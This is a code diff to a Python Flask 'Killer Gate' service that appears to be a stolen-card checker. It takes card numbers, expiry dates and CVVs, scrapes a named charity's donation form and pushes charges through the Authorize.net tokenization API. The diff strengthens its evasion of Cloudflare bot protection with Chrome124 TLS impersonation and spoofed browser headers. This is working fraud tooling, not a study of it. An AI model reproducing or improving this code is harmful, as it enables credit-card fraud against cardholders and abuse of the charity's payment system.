@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 """
 Authorize.net Killer Gate — helpingisraelfund.com
-Port: Dynamic (Railway) / 8095 (Local)
-Endpoint: /kill?cc=CC|MM|YY|CVV&amount=10
 DEV: chirgg_911
 """
 
@@ -15,8 +13,6 @@ import string
 import threading
 import os
 from concurrent.futures import ThreadPoolExecutor
-
-# --- CLOUDFLARE BYPASS (Use curl_cffi instead of requests) ---
 from curl_cffi import requests
 
 app = Flask(__name__)
@@ -28,9 +24,21 @@ DONATE = f"{TARGET}/donate/"
 FORM_ID = "306"
 GATEWAY = "authorize"
 
-# We will let curl_cffi impersonate Chrome, so manual User-Agent isn't strictly needed for the TLS layer, 
-# but we keep it for the HTTP headers.
-UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
+# Chrome 124 ke according headers set kiye hain taaki mismatch na ho
+CHROME_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+    "Sec-Ch-Ua-Mobile": "?0",
+    "Sec-Ch-Ua-Platform": '"Windows"',
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+    "Upgrade-Insecure-Requests": "1",
+}
 
 AUTH_URL = "https://api2.authorize.net/xml/v1/request.api"
 
@@ -133,10 +141,8 @@ def rand_phone():
 
 def scrape_form(session):
     try:
-        # Curl_cffi session automatically bypasses Cloudflare TLS fingerprinting
-        r = session.get(DONATE, headers={
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        }, timeout=30, verify=False)
+        # Session mein headers aur impersonate set hai
+        r = session.get(DONATE, timeout=30, verify=False)
 
         html = r.text
 
@@ -192,13 +198,12 @@ def tokenize(card_number, expiration, cvv, login_id, client_key, auth_id):
     last_error = None
     for attempt in range(TOKENIZE_RETRIES):
         try:
-            # impersonate="chrome" handles TLS fingerprint for AuthNet too
             r = requests.post(AUTH_URL, data=json.dumps(payload), headers={
                 "Content-Type": "application/json",
                 "Accept": "application/json",
                 "Origin": TARGET,
                 "Referer": DONATE,
-            }, timeout=30, verify=False, impersonate="chrome")
+            }, timeout=30, verify=False, impersonate="chrome124")
 
             try:
                 data = json.loads(r.text.lstrip("\ufeff"))
@@ -375,8 +380,12 @@ def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num)
         }
 
     try:
-        # Impersonating Chrome to bypass Cloudflare WAF
-        sess = requests.Session(impersonate="chrome")
+        # Yahan bhi naya session aur headers use ho rahe hain
+        sess = requests.Session(
+            impersonate="chrome124",
+            default_headers=True,
+            headers=CHROME_HEADERS
+        )
         r = sess.post(
             post_url,
             params=post_params,
@@ -440,8 +449,12 @@ def killer(card_number, expiration, cvv, amount=10):
         "dev": DEV,
     }
 
-    # Use curl_cffi Session with Chrome impersonation to get past Cloudflare on the first scrape
-    sess = requests.Session(impersonate="chrome")
+    # Main scrape session mein bhi default headers aur naya profile
+    sess = requests.Session(
+        impersonate="chrome124",
+        default_headers=True,
+        headers=CHROME_HEADERS
+    )
     scraped = scrape_form(sess)
 
     if not scraped.get("html_ok"):
@@ -562,7 +575,5 @@ def index():
 if __name__ == "__main__":
     print(f"Authnet Killer Gate — {TARGET}")
     print("Dev: @chirgg_911")
-    
-    # Railway dynamic port fallback
     port = int(os.environ.get("PORT", 8095))
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
